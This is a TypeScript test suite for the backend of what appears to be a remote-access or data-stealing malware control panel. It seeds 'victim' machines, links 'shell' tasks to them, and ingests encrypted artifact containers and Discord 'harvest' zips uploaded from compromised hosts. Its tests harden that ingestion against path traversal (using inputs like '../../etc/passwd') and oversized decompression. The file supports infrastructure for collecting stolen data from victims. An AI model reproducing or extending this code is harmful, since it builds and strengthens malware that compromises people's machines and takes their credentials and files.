import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createCipheriv, createHash, randomUUID } from 'node:crypto';
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { deflateRawSync } from 'node:zlib';
import AdmZip from 'adm-zip';
import { prisma } from '../server/lib/db';
import { artifactKey, randomToken, sha256hex } from '../server/lib/crypto';
import { env } from '../server/lib/env';
import { initUpload, processArtifact, safeRel, uploadDir } from '../server/services/artifact';

type Seed = { buildSecret: string; buildId: string; victimA: string; victimB: string; taskB: string };

async function seed(): Promise<Seed> {
  const buildSecret = randomToken(32);
  const build = await prisma.build.create({
    data: {
      name: `artifact-test-${randomUUID()}`,
      version: '0.0.0',
      buildId: randomUUID(),
      tokenHash: sha256hex(randomToken(32)),
      secret: buildSecret,
      config: {}
    }
  });
  const makeVictim = (hostname: string) =>
    prisma.victim.create({
      data: {
        buildId: build.id,
        hostname,
        os: 'linux',
        username: 'tester',
        deviceTokenEnc: 'v1.00.00.00'
      }
    });
  const victimA = await makeVictim('artifact-a');
  const victimB = await makeVictim('artifact-b');
  const taskB = await prisma.task.create({ data: { victimId: victimB.id, name: 'shell', params: {} } });
  return { buildSecret, buildId: build.buildId, victimA: victimA.id, victimB: victimB.id, taskB: taskB.id };
}

async function cleanup(ids: Seed) {
  await prisma.victim.deleteMany({ where: { id: { in: [ids.victimA, ids.victimB] } } });
}

test('safeRel strips roots, traversal and null bytes', () => {
  assert.equal(safeRel('../../etc/passwd'), 'etc/passwd');
  assert.equal(safeRel('C:\\Users\\rat\\..\\notes.txt'), 'Users/notes.txt');
  assert.equal(safeRel('C:\\Users\\rat\\..\\..\\secret.txt'), 'secret.txt');
  assert.equal(safeRel('/a/b/./c'), 'a/b/c');
  assert.equal(safeRel('a\0b.txt'), 'ab.txt');
  assert.equal(safeRel('..'), 'unnamed');
  assert.equal(safeRel(''), 'unnamed');
});

test('an upload only links a task that belongs to the signing victim', async () => {
  const ids = await seed();
  try {
    const victim = (await prisma.victim.findUniqueOrThrow({ where: { id: ids.victimA } }));
    const base = { module: 'shell', totalSize: 4, chunkCount: 1, sha256: 'a'.repeat(64) };
    const foreign = await initUpload({ ...victim, build: { secret: ids.buildSecret } }, { ...base, taskId: ids.taskB });
    assert.equal(foreign.taskId, null);

    const own = await prisma.task.create({ data: { victimId: ids.victimA, name: 'shell', params: {} } });
    const linked = await initUpload({ ...victim, build: { secret: ids.buildSecret } }, { ...base, taskId: own.id });
    assert.equal(linked.taskId, own.id);

    await rm(uploadDir(foreign.id), { force: true });
    await rm(uploadDir(linked.id), { force: true });
  } finally {
    await cleanup(ids);
  }
});

function container(buildSecret: string, buildId: string, victimId: string, manifest: unknown, blobs: Array<{ id: string; plain: Buffer }>) {
  const prefix = Buffer.from('0123456789abcdef01234567', 'hex');
  const manifestText = JSON.stringify(manifest);
  const expected = createHash('sha256').update(manifestText).digest('hex');
  const key = artifactKey(buildSecret, buildId, victimId, prefix);
  const parts = [Buffer.from(`${manifestText}\n`), Buffer.from(`${expected}\n`)];
  blobs.forEach((blob, index) => {
    const nonce = Buffer.concat([prefix, Buffer.alloc(4)]);
    nonce.writeUInt32BE(index, 8);
    const cipher = createCipheriv('aes-256-gcm', key, nonce);
    cipher.setAAD(Buffer.from(`${expected}:${blob.id}`));
    const compressed = deflateRawSync(blob.plain);
    const ciphertext = Buffer.concat([cipher.update(compressed), cipher.final()]);
    const tag = cipher.getAuthTag();
    const body = Buffer.concat([ciphertext, tag]);
    parts.push(Buffer.from(`BLOB ${blob.id} ${body.length}\n`), body);
  });
  return Buffer.concat(parts);
}

async function store(ids: Seed, victimId: string, bytes: Buffer) {
  const dir = await mkdtemp(join(tmpdir(), 'spc-art-'));
  const file = join(dir, 'payload.spc');
  await writeFile(file, bytes);
  return prisma.artifact.create({
    data: {
      victimId,
      module: 'shell',
      bytes: bytes.length,
      sha256: sha256hex(bytes),
      containerPath: file,
      status: 'queued'
    }
  });
}

function manifestFor(victimId: string, items: Array<{ id: string; path: string; size: number; sha256: string }>) {
  return {
    container_version: 1,
    build_id: randomUUID(),
    victim_id: victimId,
    os: 'linux',
    profile: 'full',
    module: 'shell',
    created_at: 0,
    nonce_prefix: Buffer.from('0123456789abcdef01234567', 'hex').toString('base64url'),
    total_size: 0,
    artifacts: items
  };
}

test('a container cannot escape the artifact directory', async () => {
  const ids = await seed();
  try {
    const plain = Buffer.from('escaped');
    const item = { id: 'b1', path: '../../escaped.txt', size: plain.length, sha256: sha256hex(plain) };
    const manifest = manifestFor(ids.victimA, [item]);
    const artifact = await store(ids, ids.victimA, container(ids.buildSecret, ids.buildId, ids.victimA, manifest, [{ id: 'b1', plain }]));
    await processArtifact(artifact.id);
    const row = await prisma.artifact.findUniqueOrThrow({ where: { id: artifact.id } });
    assert.equal(row.status, 'ready');
    assert.equal(await readFile(join(env.STORAGE_DIR, 'artifacts', artifact.id, 'escaped.txt'), 'utf8'), 'escaped');
    await rm(join(env.STORAGE_DIR, 'artifacts', artifact.id), { recursive: true, force: true });
  } finally {
    await cleanup(ids);
  }
});

test('a blob over the remaining budget fails before inflating past it', async () => {
  const ids = await seed();
  try {
    const plain = Buffer.from('x');
    const item = { id: 'b1', path: 'big.txt', size: env.MAX_ARTIFACT_MB * 1024 * 1024 + 1, sha256: sha256hex(plain) };
    const manifest = manifestFor(ids.victimA, [item]);
    const artifact = await store(ids, ids.victimA, container(ids.buildSecret, ids.buildId, ids.victimA, manifest, [{ id: 'b1', plain }]));
    await processArtifact(artifact.id);
    const row = await prisma.artifact.findUniqueOrThrow({ where: { id: artifact.id } });
    assert.equal(row.status, 'failed');
    assert.equal(row.error, 'artifact_unpacked_too_large');
    await rm(join(env.STORAGE_DIR, 'artifacts', artifact.id), { recursive: true, force: true });
  } finally {
    await cleanup(ids);
  }
});

test('discord zip entries stream to disk and cannot traverse', async () => {
  const ids = await seed();
  try {
    const zip = new AdmZip();
    zip.addFile('logs/nested/ok.txt', Buffer.from('inside'));
    zip.addFile('../../evil.txt', Buffer.from('outside'));
    const dir = await mkdtemp(join(tmpdir(), 'spc-zip-'));
    const file = join(dir, 'harvest.zip');
    zip.writeZip(file);
    const bytes = await readFile(file);
    const artifact = await prisma.artifact.create({
      data: {
        victimId: ids.victimA,
        source: 'discord',
        module: 'harvest',
        bytes: bytes.length,
        sha256: sha256hex(bytes),
        containerPath: file,
        status: 'queued'
      }
    });
    await processArtifact(artifact.id);
    const row = await prisma.artifact.findUniqueOrThrow({ where: { id: artifact.id } });
    assert.equal(row.status, 'ready');
    const root = join(env.STORAGE_DIR, 'artifacts', artifact.id);
    assert.equal(await readFile(join(root, 'logs', 'nested', 'ok.txt'), 'utf8'), 'inside');
    assert.equal(await readFile(join(root, 'evil.txt'), 'utf8'), 'outside');
    await rm(root, { recursive: true, force: true });
  } finally {
    await cleanup(ids);
  }
});

test('a multi-blob container keeps its cursor and contents byte-exact', async () => {
  const ids = await seed();
  try {
    const plains = [Buffer.from('first\n'), Buffer.alloc(70_000, 0x5a), Buffer.from('third ✓\n')];
    const items = plains.map((plain, index) => ({
      id: `m${index}`,
      path: `nested/dir/f${index}.bin`,
      size: plain.length,
      sha256: sha256hex(plain)
    }));
    const manifest = manifestFor(ids.victimA, items);
    const bytes = container(
      ids.buildSecret,
      ids.buildId,
      ids.victimA,
      manifest,
      items.map((item, index) => ({ id: item.id, plain: plains[index]! }))
    );
    const artifact = await store(ids, ids.victimA, bytes);
    await processArtifact(artifact.id);
    const row = await prisma.artifact.findUniqueOrThrow({ where: { id: artifact.id } });
    assert.equal(row.status, 'ready');
    const root = join(env.STORAGE_DIR, 'artifacts', artifact.id);
    for (let index = 0; index < plains.length; index++) {
      assert.deepEqual(await readFile(join(root, 'nested', 'dir', `f${index}.bin`)), plains[index]);
    }
    await rm(root, { recursive: true, force: true });
  } finally {
    await cleanup(ids);
  }
});

test('a lying declared size still stops the inflate at the cap', async () => {  const ids = await seed();
  try {
    const plain = Buffer.alloc(4096, 0x41);
    // Declared size says 1 byte, but the blob is 4096: the honest size check
    // rejects it, and the streaming meter is the second line of defence.
    const item = { id: 'b1', path: 'lie.txt', size: 1, sha256: sha256hex(plain) };
    const manifest = manifestFor(ids.victimA, [item]);
    const artifact = await store(ids, ids.victimA, container(ids.buildSecret, ids.buildId, ids.victimA, manifest, [{ id: 'b1', plain }]));
    await processArtifact(artifact.id);
    const row = await prisma.artifact.findUniqueOrThrow({ where: { id: artifact.id } });
    assert.equal(row.status, 'failed');
    assert.equal(row.error, 'blob_invalid');
    await rm(join(env.STORAGE_DIR, 'artifacts', artifact.id), { recursive: true, force: true });
  } finally {
    await cleanup(ids);
  }
});
